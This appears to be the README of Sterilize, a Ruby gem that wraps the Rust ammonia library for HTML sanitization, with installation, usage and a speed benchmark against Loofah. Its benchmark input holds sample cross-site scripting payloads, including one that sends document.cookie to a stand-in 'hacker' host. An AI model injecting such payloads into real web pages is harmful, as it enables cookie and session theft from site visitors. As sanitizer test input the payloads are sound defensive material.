# Sterilize

Sterilize is a gem which uses the Rust library [ammonia](https://github.com/rust-ammonia/ammonia) to provide text sanitization

> Ammonia is a whitelist-based HTML sanitization library. It is designed to prevent cross-site scripting, layout breaking, and clickjacking caused by untrusted user-provided HTML being mixed into a larger web page.

## Why not Loofah

Loofah is popular, but can be difficult to deal with in terms of configuration and usage. `Sterilize` aims to be essentially zero configuration and provides a very simple API (one method!). Give it a string and get back a sanitized version.

Take a look at the specs directory to see some of the cases that get handled. They are mostly provided for documentation purposes as the `ammonia` library is extensively [tested](https://github.com/rust-ammonia/ammonia/blob/master/src/lib.rs)

Finally, Sterilize is _fast_.

```ruby
unsafe_string = "I am nice safe user input, nothing to see here.. <script>console.log('installing bitcoin miner')</script><SCRIPT>var+img=new+Image();img.src='http://hacker/'%20+%20document.cookie;</SCRIPT><img src='http://url.to.file.which/not.exist' onerror=alert(document.cookie);><a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgna25pZ2h0c3RpY2sgd2FzIGhlcmUnKTwvc2NyaXB0Pg=='>HACK HACK HACK</a>" * 1000


Benchmark.bm do | benchmark |
  benchmark.report("Sterilize#perform") do
    50.times do
      Sterilize.perform(unsafe_string)
    end
  end
  benchmark.report("Loofah.scrub_fragment(unsafe_string, :prune).to_str") do
    50.times do
      Loofah.scrub_fragment(unsafe_string, :prune).to_str
    end
  end
end
```

As you can see, Sterilize can operate significatnly faster (somewhere in the ballpark of 9-10 times faster). As with all benchmarks though, your mileage may vary and it's important to see how things work in practice for you.

| Library                                             | user       | system   | total      | real         |
| --------------------------------------------------- | ---------- | -------- | ---------- | ------------ |
| Sterilize#perform                                   | 1.284460   | 0.006097 | 1.290557   | ( 1.295062)  |
| Loofah.scrub_fragment(unsafe_string, :prune).to_str | 10.183802  | 0.064826 | 10.248628  | ( 10.274430) |

## Installation

In order to use this library you will need to have access to Rust's build tooling [cargo](https://doc.rust-lang.org/cargo/getting-started/installation.html), this simplest way to get this is via [rustup](https://rustup.rs/).

After ensuring you have these things available, add the gem to your bundle

```ruby
gem 'sterilize'
```

And then execute:

    $ bundle

Or install it yourself as:

    $ gem install sterilize

`sterilize` includes a Rake take which will compile the Rust library for your platform and copy it to the correct location.

## Usage

`sterilize` provides a single method, `Sterilize.perform` which accepts a string.

```shell
pry(main)> unsafe_string = "I am nice safe user input, nothing to see here.. <script>console.log('installing bitcoin miner')</script>"
pry(main)> Sterilize.perform(unsafe_string)
=> "I am nice safe user input, nothing to see here.. "
```

Passing anything other than a `String` will result in an error.

## Development

After checking out the repo, run `bin/setup` to install dependencies. Then, run `rake spec` to run the tests. You can also run `bin/console` for an interactive prompt that will allow you to experiment.

To install this gem onto your local machine, run `bundle exec rake install`. To release a new version, update the version number in `version.rb`, and then run `bundle exec rake release`, which will create a git tag for the version, push git commits and tags, and push the `.gem` file to [rubygems.org](https://rubygems.org).

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/[USERNAME]/sterilize. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.

## License

The gem is available as open source under the terms of the [MIT License](https://opensource.org/licenses/MIT).
